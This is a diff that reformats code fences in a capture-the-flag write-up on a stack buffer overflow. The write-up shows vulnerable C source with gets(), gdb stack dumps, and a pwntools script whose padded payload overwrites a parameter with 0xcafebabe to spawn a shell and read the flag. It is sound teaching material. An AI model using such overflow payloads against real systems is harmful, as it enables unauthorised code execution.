@@ -6,7 +6,7 @@ This challenge requires us to perform a simple Buffer Overflow attack for overwr
 The C source code for challenge program is shown below, where the vulnerability is the *gets(overflowme)* call since *char * gets( char * )* has no array boundary checks and just reads *stdin* until the newline character.
 
 *bof.c*
-'''
+```
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -25,11 +25,11 @@ int main(int argc, char* argv[]){
 	func(0xdeadbeef);
 	return 0;
 }
-'''
+```
 
 Using this vulnerability, we can overflow the stack and overwrite the default *0xdeadbeef* parameter to be *0xcafebabe* in order to bypass the *key == 0xcafebabe* check and get a shell. The final piece to the puzzle is figuring out how big our input should be to overflow the key parameter. I used *gdb* to analyse the stack just before the *key == 0xcafebabe* comparison check, by creating a breakpoint at the CMP machine instruction.
 
-'''
+```
 gdb-peda$ disas func
 Dump of assembler code for function func:
    0x0000062c <+0>:	push   ebp
@@ -58,11 +58,11 @@ Dump of assembler code for function func:
    0x00000689 <+93>:	ret    
 End of assembler dump.
 gdb-peda$ b * func+40
-'''
+```
 
 Now we can just run the program inside *gdb* and give it an input of 'AAAAAAAA' until the breakpoint to help identify where the buffer is located on the stack. The character 'A' was randomly chosen, since it has an ascii value of 41 which can help us identify where the buffer is.
 
-'''
+```
 gdb-peda$ x/50wx $esp
 0xffffd1c0:	0xffffd1dc	0xffffd2c4	0xf7fb2000	0xf7fb09e0
 0xffffd1d0:	0x00000000	0xf7fb2000	0xf7ffc840	**0x41414141**
@@ -77,14 +77,14 @@ gdb-peda$ x/50wx $esp
 0xffffd260:	0x00000000	0x0122c2f7	0x41a9e4e7	0x00000000
 0xffffd270:	0x00000000	0x00000000	0x00000001	0x56555530
 0xffffd280:	0x00000000	0xf7fe9450
-'''
+```
 
 The buffer starts at the top *0x41414141* entry in the stack, which is located at 4*13=52 bytes above the *0xdeadbeef* parameter. Therefore our input needs to have 52 bytes before we overflow the parameter. However, since our target system has little-endian ordering we will have to reverse our overflowing value.
 
 We can now write our *pwn* script so that we overflow the buffer by 52 bytes then overwrite the passed parameter to the *func* call.
 
 *bof_pwn.py*
-'''
+```
 from pwn import *
 
 payload = 52*'A' + '\xbe\xba\xfe\xca'
@@ -101,4 +101,4 @@ Hooray! We have just got our flag!
 $
 $ cat flag
 daddy, I just pwned a buFFer :)
-'''
+```
